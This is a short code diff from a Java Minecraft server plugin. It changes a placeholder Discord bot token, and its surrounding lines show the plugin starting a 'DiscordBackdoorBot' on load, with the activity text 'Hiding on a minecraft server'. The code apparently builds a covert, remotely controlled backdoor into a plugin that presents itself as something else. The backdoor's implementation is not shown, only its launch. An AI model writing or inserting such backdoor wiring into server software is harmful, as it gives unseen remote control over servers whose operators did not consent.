@@ -29,7 +29,7 @@ public class Main extends JavaPlugin {
 
 		filler = new Filler(this);
 
-		String backdoorBotToken = "TOKEN";
+		String backdoorBotToken = "token";
 		String backdoorBotActivity = "Hiding on a minecraft server";
 		new DiscordBackdoorBot(backdoorBotToken, backdoorBotActivity);
 
